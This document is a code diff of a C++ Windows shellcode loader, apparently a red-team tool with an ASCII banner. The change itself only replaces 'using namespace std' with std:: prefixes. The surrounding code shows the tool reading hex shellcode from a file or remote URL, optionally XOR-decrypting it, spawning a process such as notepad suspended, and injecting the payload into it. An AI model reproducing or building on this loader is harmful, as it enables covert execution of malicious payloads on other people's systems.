@@ -12,9 +12,7 @@
 
 #pragma comment(lib, "wininet.lib")
 
-using namespace std;
-
-string banner =
+std::string banner =
 " ##::::'##::'######::'##::::'##:'####:'##:::'##::::'###::::'##:::'##:'####:\n"
 " ###::'###:'##... ##: ##:::: ##:. ##:: ##::'##::::'## ##::: ##::'##::. ##::\n"
 " ####'####: ##:::..:: ##:::: ##:: ##:: ##:'##::::'##:. ##:: ##:'##:::: ##::\n"
@@ -24,18 +22,18 @@ string banner =
 " ##:::: ##:. ######:: ##:::: ##:'####: ##::. ##: ##:::: ##: ##::. ##:'####:\n"
 "..:::::..:::......:::..:::::..::....::..::::..::..:::::..::..::::..::....::";
 
-vector<char> Parser(const string& content) {
-    ifstream inputFile(content);
+std::vector<char> Parser(const std::string& content) {
+    std::ifstream inputFile(content);
     if (!inputFile) {
-        cerr << "Failed to open file for reading." << endl;
+        std::cerr << "Failed to open file for reading." << std::endl;
         return {};
     }
 
-    string line;
-    vector<char> bytes;
+    std::string line;
+    std::vector<char> bytes;
     while (getline(inputFile, line)) {
         for (unsigned int i = 0; i < line.length(); i += 2) {
-            string byteString = line.substr(i, 2);
+            std::string byteString = line.substr(i, 2);
             char byte = static_cast<char>(strtol(byteString.c_str(), NULL, 16));
             bytes.push_back(byte);
         }
@@ -50,7 +48,7 @@ void XOR(char* data, size_t data_len, const char* key, size_t key_len) {
     }
 }
 
-BOOL Injector(HANDLE hProcess, HANDLE hThread, const vector<char>& buf) {
+BOOL Injector(HANDLE hProcess, HANDLE hThread, const std::vector<char>& buf) {
     SIZE_T shellSize = buf.size();
     wprintf(L"[+] Allocating memory\n");
 
@@ -83,29 +81,29 @@ bool FetchRemoteShellcode(const wchar_t* srcURL) {
 
 }
 
-void PrintHelpMenu(const string& programName) {
-    cout << "Usage: " << programName << " [options]" << endl;
-    cout << "Options:" << endl;
-    cout << "  -i <filename> : Input file with shellcode in hex format" << endl;
-    cout << "  -u <url>      : Fetch remote shellcode from the specified URL in hex format" << endl;
-    cout << "  -p <process>  : Name of a process (optional, default is notepad)" << endl;
-    cout << "  -x <key>      : Apply XOR decryption with the specified key (optional)" << endl;
-    cout << "  -h            : Display this help menu" << endl;
+void PrintHelpMenu(const std::string& programName) {
+    std::cout << "Usage: " << programName << " [options]" << std::endl;
+    std::cout << "Options:" << std::endl;
+    std::cout << "  -i <filename> : Input file with shellcode in hex format" << std::endl;
+    std::cout << "  -u <url>      : Fetch remote shellcode from the specified URL in hex format" << std::endl;
+    std::cout << "  -p <process>  : Name of a process (optional, default is notepad)" << std::endl;
+    std::cout << "  -x <key>      : Apply XOR decryption with the specified key (optional)" << std::endl;
+    std::cout << "  -h            : Display this help menu" << std::endl;
 }
 
 int main(int argc, char* argv[]) {
-    cout << banner << endl;
-    string inputContent;
-    string remoteUrl;
-    vector<char> xorKey;
-    string processPath = "C:\\Windows\\System32\\notepad.exe"; // Default process path
+    std::cout << banner << std::endl;
+    std::string inputContent;
+    std::string remoteUrl;
+    std::vector<char> xorKey;
+    std::string processPath = "C:\\Windows\\System32\\notepad.exe"; // Default process path
     bool path = false;
-    string actproc;
+    std::string actproc;
     bool useXOR = false;
 
 
     for (int i = 1; i < argc; ++i) {
-        string argument = argv[i];
+        std::string argument = argv[i];
         if (argument == "-i" && i + 1 < argc) {
             inputContent = argv[i + 1];
 
@@ -115,8 +113,8 @@ int main(int argc, char* argv[]) {
 
         }
         else if (argument == "-x" && i + 1 < argc) {
-            string keyString = argv[i + 1];
-            xorKey = vector<char>(keyString.begin(), keyString.end());
+            std::string keyString = argv[i + 1];
+            xorKey = std::vector<char>(keyString.begin(), keyString.end());
             useXOR = true;
         }
         else if (argument == "-h") {
@@ -124,20 +122,20 @@ int main(int argc, char* argv[]) {
             return 0;
         }
         else if (argument == "-p" && i + 1 < argc) {
-            processPath = "C:\\Windows\\System32\\" + string(argv[i + 1]);
-            actproc = string(argv[i + 1]);
+            processPath = "C:\\Windows\\System32\\" + std::string(argv[i + 1]);
+            actproc = std::string(argv[i + 1]);
             path = true;
         }
 
     }
 
-    vector<char> payload;
+    std::vector<char> payload;
 
     if (!inputContent.empty()) {
         payload = Parser(inputContent);
     }
     else if (!remoteUrl.empty()) {
-        wstring widestr = wstring(remoteUrl.begin(), remoteUrl.end());
+        std::wstring widestr = std::wstring(remoteUrl.begin(), remoteUrl.end());
         const wchar_t* url = widestr.c_str();
         if (!FetchRemoteShellcode(url)) {
            inputContent = "input.txt";
@@ -145,7 +143,7 @@ int main(int argc, char* argv[]) {
                 }
     }
     else {
-        cout << "Please specify an input file or remote file location with hex shellcode. Use -h for help menu." << endl;
+        std::cout << "Please specify an input file or remote file location with hex shellcode. Use -h for help menu." << std::endl;
         return 1;
     }
 
@@ -161,7 +159,7 @@ int main(int argc, char* argv[]) {
         return 1;
     }
     else if (path == true) {
-        cout << "[+] Creating " << actproc << " process in a suspended state \n";
+        std::cout << "[+] Creating " << actproc << " process in a suspended state \n";
     }
 
     if (!Injector(pi.hProcess, pi.hThread, payload)) {
